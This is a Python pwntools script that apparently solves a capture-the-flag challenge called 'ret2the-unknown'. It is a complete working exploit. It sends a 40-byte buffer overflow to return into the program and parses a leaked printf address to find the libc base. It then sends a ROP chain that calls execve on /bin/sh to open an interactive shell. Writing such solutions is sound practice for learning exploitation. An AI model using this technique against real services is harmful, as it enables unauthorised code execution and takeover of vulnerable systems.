#!/usr/bin/env python3

from pwn import *

exe = ELF("./bin/ret2the-unknown")
libc = ELF("./libc-2.28.so")
ld = ELF("./ld-2.28.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    return remote('localhost', 5000)


def main():
    r = conn()
    r.sendline(b"A" * 40 + p64(0x401186))
    r.recvuntil("there: ")
    libc.address = int(r.recvline(keepends=False), 16) - libc.symbols["printf"]
    r.info("libc base: " + hex(libc.address))
    rop = ROP(libc)
    rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)
    r.sendline(b"A" * 40 + bytes(rop))
    r.interactive()


if __name__ == "__main__":
    main()
